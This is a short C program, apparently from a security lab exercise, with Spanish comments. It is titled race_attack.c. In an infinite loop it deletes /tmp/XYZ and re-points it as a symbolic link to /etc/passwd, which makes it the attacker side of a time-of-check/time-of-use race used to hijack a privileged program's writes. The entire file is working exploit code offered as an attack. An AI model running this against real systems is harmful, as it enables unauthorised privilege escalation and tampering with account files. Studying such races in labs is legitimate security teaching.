// race_attack.c
#include <stdio.h>   // Biblioteca estándar para entrada/salida
#include <unistd.h>  // Biblioteca para llamadas al sistema UNIX como unlink y symlink

int main() {
    while (1) {  // Ciclo infinito para intentar continuamente el ataque
        unlink("/tmp/XYZ");                        // Elimina el enlace o archivo /tmp/XYZ si existe
        symlink("/etc/passwd", "/tmp/XYZ");        // Crea un enlace simbólico desde /tmp/XYZ hacia /etc/passwd
    }
    return 0;   // Este retorno nunca se ejecutará por ser un ciclo infinito, pero se incluye por buenas prácticas
}
